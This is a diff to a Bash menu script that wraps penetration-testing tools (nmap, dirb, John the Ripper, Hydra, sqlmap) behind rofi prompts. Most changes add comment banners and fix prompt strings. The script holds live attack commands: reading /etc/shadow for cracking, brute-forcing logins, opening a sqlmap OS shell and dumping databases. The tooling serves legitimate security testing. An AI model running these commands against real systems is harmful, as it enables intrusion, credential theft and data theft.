@@ -11,11 +11,16 @@ while true; do
 
 	if [[ "$syntax" == "1" ]]; then
 		IPOptions=$(echo -e "1.  Manual\n2.  Interface\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select IP Address?"| cut -d '.' -f 1)
+			
+		##-----------------------------##
+		##     Select IP Manual        ##
+		##-----------------------------##
 		if [[ "$IPOptions" == "1" ]]; then
-			scan=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter IP
+			scan=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter IP");
 
-
-			");
+		##-----------------------------##
+		##  Select IP From Interface   ##
+		##-----------------------------##
 		elif [[ "$IPOptions" == "2" ]]; then
 			interface=$(ifconfig | cut -d ":" -f 1 | cut -d " " -f 1 | sed '/^$/d' | grep -v 'lo' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which interface do you want to use?" )
 			myip=$(ifconfig "$interface" | grep -win 'inet' | cut -d " " -f 10)
@@ -35,7 +40,10 @@ while true; do
 	elif [[ $syntax == "2" ]]; then
 		while true; do
 			nmapscan=$(echo -e  "1. Stealth Scan\n2. Quick Scan\n3. Full Scan\n4. UDP Quick Scan\n5. Full Scan+\n6. Port Knocker\n7. Back\n8. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What type of nmap scan would you like to use?" | cut -d '.' -f 1)
-
+			
+			##-----------------------------##
+			##     Nmap Stealth Scan       ##
+			##-----------------------------##
 			if [[ $nmapscan == "1" ]]; then
 				mkdir -p "$scan/NmapScans/StealthScan"
 				sudo nmap -T1 -sS -vv "$scan" -oX  "$scan/NmapScans/StealthScan/$scan.xml"
@@ -49,7 +57,9 @@ while true; do
 					xdg-open "http:$scan:$i" &
 				done <$scan/http_ports.txt
 
-
+			##-----------------------------##
+			##      Nmap Quick Scan        ##
+			##-----------------------------##
 			elif [[ $nmapscan == "2" ]]; then
 				mkdir -p "$scan/NmapScans/QuickScan"
 				nmap -sC -sV -T4 "$scan" -oX  "$scan/NmapScans/QuickScan/$scan.xml"
@@ -63,21 +73,9 @@ while true; do
 					xdg-open "http:$scan:$i" &
 				done <$scan/http_ports.txt
 
-
-			elif [[ $nmapscan == "2" ]]; then
-				mkdir -p "$scan/NmapScans/QuickScan"
-				nmap -sC -sV -T4 "$scan" -oX  "$scan/NmapScans/QuickScan/$scan.xml"
-				xsltproc "$scan/NmapScans/QuickScan/$scan.xml" -o "$scan/NmapScans/QuickScan/$scan.html"
-				rm -f "$scan/NmapScans/QuickScan/$scan.xml"
-				xdg-open "$scan/NmapScans/QuickScan/$scan.html" &
-				grep -B 3 -E "(http|https)" $scan/NmapScans/QuickScan/$scan.html | grep -B 1 "tcp" | cut -d ">" -f "2" | cut -d "<" -f "1" | grep -v "tcp" | grep -v "-" > $scan/http_ports.txt
-				sed -i 's/^80$//g' $scan/http_ports.txt
-				while read i;
-				do
-					xdg-open "http:$scan:$i" &
-				done <$scan/http_ports.txt
-
-
+			##-----------------------------##
+			##       Nmap Full Scan        ##
+			##-----------------------------##
 			elif [[ $nmapscan == "3" ]]; then
 				mkdir -p "$scan/NmapScans/FullScan"
 				nmap -sC -sV -p- "$scan" -oX  "$scan/NmapScans/FullScan/$scan.xml"
@@ -91,9 +89,9 @@ while true; do
 					xdg-open "http:$scan:$i" &
 				done <$scan/http_ports.txt
 
-
-				
-
+			##-----------------------------##
+			##     Nmap Quick UDP Scan     ##
+			##-----------------------------##
 			elif [[ $nmapscan == "4" ]]; then
 				mkdir -p "$scan/NmapScans/QuickUDP"
 				sudo nmap -sU -sV -T4 "$scan" -oX  "$scan/NmapScans/QuickUDP/$scan.xml"
@@ -107,7 +105,10 @@ while true; do
 					xdg-open "http:$scan:$i" &
 				done <$scan/http_ports.txt
 
-
+			
+			##-----------------------------##
+			##       Nmap FullScan+        ##
+			##-----------------------------##
 			elif [[ $nmapscan == "5" ]]; then
 				mkdir -p "$scan/NmapScans/FullScan+"
 				nmap -sV -n -v -Pn -p- -T4 -A "$scan" -oX "$scan/NmapScans/FullScan+/$scan.xml"
@@ -121,6 +122,9 @@ while true; do
 					xdg-open "http:$scan:$i" &
 				done <$scan/http_ports.txt
 
+			##-----------------------------##
+			##     Nmap Port Knocker       ##
+			##-----------------------------##
 			elif [[ $nmapscan == "6" ]]; then
 				port=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Port Number
 
@@ -129,8 +133,15 @@ while true; do
 				nmap -Pn --host-timeout 100 --max-retries 0 -p "$port" "$scan" 
 
 
+			##-----------------------------##
+			##          Nmap Back          ##
+			##-----------------------------##
 			elif [[ $nmapscan == "7" ]]; then
 				break
+
+			##-----------------------------##
+			##          Nmap Exit          ##
+			##-----------------------------##
 			elif [[ $nmapscan == "8" ]]; then
 				exit   
 			fi
@@ -148,7 +159,10 @@ while true; do
 	elif [[ $syntax == "3" ]]; then
 		while true; do
 			dirb=$(echo -e "1.  Default Directory list\n2.  Choose a Directory List\n3.  Add File Extentions .php .old and .bak\n4.  Back\n5.  Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Dirb Command would you like to use?" | cut -d '.' -f 1)
-			###Default Directory List
+			
+			##-----------------------------##
+			##    Dirb Default Directory   ##
+			##-----------------------------##
 			if [[ $dirb == "1" ]]; then
 				while read i;
 				do
@@ -159,7 +173,9 @@ while true; do
 				sed -r -i -e 's/[(]CODE:.*[)]|SIZE:.*//g' $scan/directory.txt
 				cat $scan/directory.txt
 
-				###Choose Directory List
+			##-----------------------------##
+			##    Dirb Choose Directory    ##
+			##-----------------------------##
 			elif [[ $dirb == "2" ]]; then
 				dirlist=$(find /usr/share/dirb/wordlists/* /usr/share/dirbuster/wordlists/* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
 				while read i;
@@ -171,8 +187,9 @@ while true; do
 				sed -r -i -e 's/[(]CODE:.*[)]|SIZE:.*//g' $scan/directory.txt
 				cat $scan/directory.txt
 	
-
-				##Add File Extention
+			##-----------------------------##
+			##   Dirb Add File Extention   ##
+			##-----------------------------##
 			elif [[ $dirb == "3" ]]; then
 				dirlist=$(find /usr/share/dirb/wordlists/* /usr/share/dirbuster/wordlists/* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
 				while read i;
@@ -185,11 +202,17 @@ while true; do
 				cat $scan/directory.txt
 
 
-				##BACK
+			
+			##-----------------------------##
+			##          Dirb Back          ##
+			##-----------------------------##
 			elif [[ $dirb == "4" ]]; then
 				break
 
-				##EXIT
+			
+			##-----------------------------##
+			##          Dirb Exit          ##
+			##-----------------------------##
 			elif [[ $dirb == "5" ]]; then
 				exit
 			fi
@@ -251,40 +274,79 @@ while true; do
 					userlist=$(find /usr/share/ncrack/* /usr/share/seclists/Usernames/* ./Users/* -name '*.txt' -o -name '*.usr' | sort |rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Username List would you like to use?")
 					passlist=$(find /usr/share/ncrack/* /usr/share/seclists/Passwords/* ./Pass/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
 					while true; do
-						john=$(echo -e  "1.  Encryption Formats\n2.  Unshadow\n3.  Brute Force Users List\n4.  Brute Force Single User((Not Complete)\n5.  Show Cracked Passwords\n6.  Dictionary Attack\n7.  Default Wordlist\n8.  Mangled Rules\n9.  Crack Cisco Secret 5\n10. Change User & Pass List\n11. Back\n12. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which John The Ripper Attack would you like to use?" | cut -d '.' -f 1)
-
+						john=$(echo -e  "1.  Encryption Formats\n2.  Unshadow\n3.  Brute Force Users List\n4.  Brute Force Single User\n5.  Show Cracked Passwords\n6.  Dictionary Attack\n7.  Default Wordlist\n8.  Mangled Rules\n9.  Crack Cisco Secret 5\n10. Change User & Pass List\n11. Back\n12. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which John The Ripper Attack would you like to use?" | cut -d '.' -f 1)
+						
+						##----------------------------##
+						##  John Encryption Formats   ##
+						##----------------------------##
 						if [[ $john == "1" ]]; then
 							john --list=formats
+						
+						##----------------------------##
+						##       John Unshadow        ##
+						##----------------------------##
 						elif [[ $john == "2" ]]; then
 							unshadow /etc/passwd /etc/shadow > hashes.txt
+
+						##-----------------------------##
+						## John Brute Force Users List ##
+						##-----------------------------##							
 						elif [[ $john == "3" ]]; then
 							john -incremental -users:"$userlist" -wordlist="$passlist"
+
+						##-----------------------------##
+						## John BruteForce Single User ##
+						##-----------------------------##
 						elif [[ $john == "4" ]]; then
-
-							victim=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2
-
-
-							");
+							victim=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2");
 							john -incremental -users:"$victim"
+
+						##-----------------------------##
+						## John Show Cracked Passwords ##
+						##-----------------------------##
 						elif [[ $john == "5" ]]; then
 							john --show hashes.txt
+
+						##----------------------------##
+						##   John Dictionary Attack   ##
+						##----------------------------##
 						elif [[ $john == "6" ]]; then
 							john -wordlist="$passlist" hashes.txt
+
+						##----------------------------##
+						##   John Default Wordlist    ##
+						##----------------------------##
 						elif [[ $john == "7" ]]; then
-							victim=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2
-
-
-							");
-
+							victim=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2");
 							john -wordlist -users="$victim" hashes.txt
+
+						##----------------------------##
+						##     John Mangled Rules     ##
+						##----------------------------##
 						elif [[ $john == "8" ]]; then
 							john -wordlist="$passlist" -rules hashes.txt
+
+						##----------------------------##
+						##  John Crack Cisco Secret   ##
+						##----------------------------##
 						elif [[ $john == "9" ]]; then
 							john --format=md5crypt --fork=4 -wordlist="$passlist" hashes.txt
+
+						##----------------------------##
+						## John Change User/Pass List ##
+						##----------------------------##
 						elif [[ $john == "10" ]]; then
 							break	
+
+						##----------------------------##
+						##         John Back          ##
+						##----------------------------##
 						elif [[ $john == "11" ]]; then
 							break 2
+
+					        ##----------------------------##
+						##         John Exit          ##
+						##----------------------------##
 						elif [[ $john == "12" ]]; then
 							exit   
 						fi
@@ -318,13 +380,16 @@ while true; do
 						elif [[ $hydra == "2" ]]; then
 
 							hydra2Options=$(echo -e "1.  Manual\n2.  Dirb List\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select Website?"| cut -d '.' -f 1)
+
+							##-----------------------------##
+							##      HTTP Basic Manual      ##
+							##-----------------------------##
 							if [[ "$hydra2Options" == "1" ]]; then
-								url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter URL
+								url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter URL");
 
-
-								");
-
-
+							##-----------------------------##
+							##     HTTP Basic Dirb List    ##
+							##-----------------------------##
 							elif [[ "$hydra2Options" == "2" ]]; then
 								url=$(cat $scan/directory.txt | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select URL From List" )
 
@@ -348,13 +413,16 @@ while true; do
 						##-----------------------------##
 						elif [[ $hydra == "4" ]]; then
 							hydra2Options=$(echo -e "1.  Manual\n2.  Dirb List\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select Website?"| cut -d '.' -f 1)
+						
+							##-----------------------------##
+							##    Web Login URL Manual     ##
+							##-----------------------------##
 							if [[ "$hydra2Options" == "1" ]]; then
-								url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter URL
+								url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter URL");
 
-
-								");
-
-
+							##-----------------------------##
+							##   Web Login URL Dirb List   ##
+							##-----------------------------##
 							elif [[ "$hydra2Options" == "2" ]]; then
 								url=$(cat $scan/directory.txt | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select URL From List" )
 
@@ -362,14 +430,20 @@ while true; do
 
 							rname=$(echo "$url" | cut -d "/" -f 3);
 							fpath=$(echo "$url" | cut -d "/" -f 4-99);
-	
+
 							formQuestion=$(echo -e "1.  Manual\n2.  From List\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select Website?"| cut -d '.' -f 1)
+
+							##-----------------------------##
+							##    Web Login Form Manual    ##
+							##-----------------------------##
 							if [[ "$formQuestion" == "1" ]]; then
 								usrForm=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter User Form");
 								passForm=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Password Form");
 
 
-
+							##-----------------------------##
+							##      Web Login Form List    ##
+							##-----------------------------##
 							elif [[ "$formQuestion" == "2" ]]; then
 								wget -q http://vtcsec/secret/wp-login.php -O $scan/FormPage
 								cat $scan/FormPage | awk  -F 'name=' '{print $2}'| awk -F 'id=' '{print $1}' | sed 's/"//g' | sed '/^$/d' | awk 'NF==1' > $scan/fp
@@ -383,11 +457,7 @@ while true; do
 							fi
 
 
-							loginFail=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Login Fail Message"
-							
-							
-							
-							);
+							loginFail=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Login Fail Message");
 
 
 							echo -e "hydra $rname http-post-form /$fpath':$usrForm=^USER^&$passForm=^PASS^:$loginFail' -L $userlist -P $passlist -f -V\n"
@@ -398,21 +468,20 @@ while true; do
 						##        Hydra Pop3           ##
 						##-----------------------------##
 						elif [[ $hydra == "5" ]]; then
-
 							UserQuestion=$(echo -e  "Yes\nNo" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Do you know the Username?")
+
+							##-----------------------------##
+							##      Pop3 Username Yes      ##
+							##-----------------------------##
 							if [[ $UserQuestion == "Yes" ]]; then 
-								user=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Username:
-
-
-								");
-
-
-
+								user=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Username:");
 								echo -e "hydra -l $user -P $passlist -t20 $scan -s$port -I pop3\n"
 								hydra -l "$user" -P "$passlist" -t20 "$scan" -s"$port" -I pop3
 
+							##-----------------------------##
+							##      Pop3 Username No       ##
+							##-----------------------------##
 							elif [[ $UserQuestion == "No" ]]; then 
-
 								echo -e "hydra -L $userlist-P $passlist -t20 $scan -s$port -I pop3\n"
 								hydra -L "$userlist" -P "$passlist" -t20 "$scan" -s"$port" -I pop3
 
@@ -473,295 +542,304 @@ while true; do
 ##---------------------------------------------------##
 ##                  SQL Map                          ##
 ##---------------------------------------------------##
-
-
 	elif [[ "$syntax" == "6" ]]; then
 		while true; do
-			sqlmaps=$(echo -e "1.  Interactive Shell\n2.  Get Request\n3.  Post Request\n4.  Banner Grab\n5.  Payloads Used\n6.  Find Users\n7.  Show Databases\n8.  Show Tables\n9.  Show Columns\n10. Dump Database\n11. Burp Output(NOT WORKING)\n12. Back\n13. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)
+			sqlmaps=$(echo -e "1.  Interactive Shell\n2.  Get Request\n3.  Post Request\n4.  Banner Grab\n5.  Payloads Used\n6.  Find Users\n7.  Show Databases\n8.  Show Tables\n9.  Show Columns\n10. Dump Database\n11. Burp Output\n12. Back\n13. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)
 
-				##Interactive Shell
-				if [[ $sqlmaps == "1" ]]; then
-					url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-					");
-
-					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --os-shell
+			##-----------------------------##
+			##  SQL Map Interactive Shell  ##
+			##-----------------------------##
+			if [[ $sqlmaps == "1" ]]; then
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
+				sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --os-shell
 
 
-				##Get Request	
+			##-----------------------------##
+			##     SQL Map Get Request     ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "2" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
+
+				##-----------------------------##
+				##     Get Request In URL      ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
 					sqlmap --keep-alive --answers="follow=y" --batch  -u "$url" -p "$id" --technique=U
 
+				##-----------------------------##
+				##     Get Request In Form     ##
+				##-----------------------------##
 				else
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms
 
 				fi
 
-				##Post Request	
+			##-----------------------------##
+			##     SQL Map Post Request    ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "3" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
 
+				##-----------------------------##
+				##     Post Request In URL     ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --data=POSTstring -p "$id"
 
+				##-----------------------------##
+				##     Post Request In Form    ##
+				##-----------------------------##
 				else
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --data=POSTstring 
 
 				fi
 
-				##Banner Grab	
+			##-----------------------------##
+			##     SQL Map Banner Grab     ##
+			##-----------------------------##	
 			elif [[ $sqlmaps == "4" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
 
+				##-----------------------------##
+				##      Banner Grab In URL     ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U --banner
 
+				##-----------------------------##
+				##     Banner Grab In Form     ##
+				##-----------------------------##
 				else
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --banner
 
 				fi
 
-				##Payloads Used
+			##-----------------------------##
+			##    SQL Map Payloads Used    ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "5" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
 
+				##-----------------------------##
+				##     Payloads Used In URL    ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U --banner -v3 --fresh-queries
 
+				##-----------------------------##
+				##    Payloads Used In Form    ##
+				##-----------------------------##
 				else
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --banner -v3 --fresh-queries
 
 				fi
 
-
-				##Find Users
+			##-----------------------------##
+			##     SQL Map Find Users      ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "6" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
 
+				##-----------------------------##
+				##      Find Users In URL      ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -users
 
+				##-----------------------------##
+				##      Find Users In Form     ##
+				##-----------------------------##
 				else
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -users
 
 				fi
 
-
-				##Show Database
+			##-----------------------------##
+			##    SQL Map Show Databases   ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "7" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
 
+				##-----------------------------##
+				##    Show Databases In URL    ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs
 
+				##-----------------------------##
+				##    Show Databases In Form   ##
+				##-----------------------------##
 				else
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs
 
 				fi
 
-
-				##Show Tables
+			##-----------------------------##
+			##     SQL Map Show Tables     ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "8" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
 
+				##-----------------------------##
+				##      Show Tables In URL     ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
-					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use 
-
-					");
-
+					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use ");
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables
 
+				##-----------------------------##
+				##     Show Tables In Form     ##
+				##-----------------------------##
 				else
-					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use 
-
-					");
-
+					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use ");
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables
 
 
 
 				fi
 
-				##Show Columns
+			##-----------------------------##
+			##     SQL Map Show Columns    ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "9" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
 
+				##-----------------------------##
+				##     Show Columns In URL     ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
-					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 
-
-					");
-
-					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table
-
-					");
+					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database ");
+					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table");
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" -columns
+
+				##-----------------------------##
+				##     Show Columns In Form    ##
+				##-----------------------------##
 				else
-					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 
-
-					");
-
-					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table
-
-					");
+					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database ");
+					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table");
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" -columns
 
 
 				fi
 
-				##Dump Databases
+			##-----------------------------##
+			##     SQL Map Dump Database   ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "10" ]]; then
-				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL
-
-
-				");
+				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL");
 				index="="
 
+				##-----------------------------##
+				##     Dump Database In URL    ##
+				##-----------------------------##
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1) 
-					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 
-
-					");
-
